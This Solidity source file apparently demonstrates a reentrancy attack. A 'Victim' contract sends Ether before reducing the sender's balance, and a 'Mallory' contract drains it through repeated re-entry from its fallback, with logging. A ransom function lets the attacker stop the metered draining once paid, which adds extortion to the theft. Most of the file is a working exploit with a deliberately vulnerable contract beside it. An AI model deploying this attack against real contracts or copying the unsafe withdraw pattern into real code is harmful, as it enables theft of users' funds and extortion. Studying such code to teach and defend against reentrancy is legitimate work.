// SPDX-License-Identifier: GPL-3.0
pragma solidity ^0.8.7;
import "hardhat/console.sol";

contract Victim{ 
    mapping(address => uint) public balances;

    function deposit() public payable {
        balances[msg.sender] += msg.value;
    }

    function withdraw(uint amount) public{ 
        uint bal = balances[msg.sender];
        require(bal > 0,"Not enough balance");
        require(bal >= amount,"Amount higher that total balance");

        (bool sent, ) = msg.sender.call{value: amount}("");
        // require(sent, "Failed to send Ether");

        balances[msg.sender] -= amount ;
    }
}

contract Mallory {
    Victim public depositFunds;
    address owner;
    uint tap;
    uint ransom;

    constructor(address _depositFundsAddress) {
        depositFunds = Victim(_depositFundsAddress);
        owner = msg.sender;
        tap = 99; // default arbitrary value to siphon everything when ransom is not payed
        ransom = 1 ether;
    }

    // Fallback is called when DepositFunds sends Ether to this contract.
    fallback() external payable {
         
        if ( address(depositFunds).balance >= msg.value && tap == 99) {
            console.log("withdraw all ",address(depositFunds).balance);
            depositFunds.withdraw(msg.value);
        }
        else if (address(depositFunds).balance >= msg.value && tap > 0) {            
            console.log("withdraw taps ",tap," ",address(depositFunds).balance);
            tap = tap -1;
            depositFunds.withdraw(msg.value);
        }
        console.log("Fisished");
    }

    function attack(uint _tap) external payable {
        // tap is used in the step 2) and 4) of the attack, to continue doing reentrancy but int small doses
        console.log("start attack ",_tap);
        tap = _tap;

        depositFunds.deposit{value: msg.value}();
        depositFunds.withdraw(msg.value);
    }

    function payRansom() external payable {
        // The victim pays the ransom and the contract gets destroyed
        require(msg.value >= ransom);
        selfdestruct(payable(owner));

    }

    function setRansom(uint _ransom) external {
        require(msg.sender == owner);
        ransom = _ransom;
    }
}


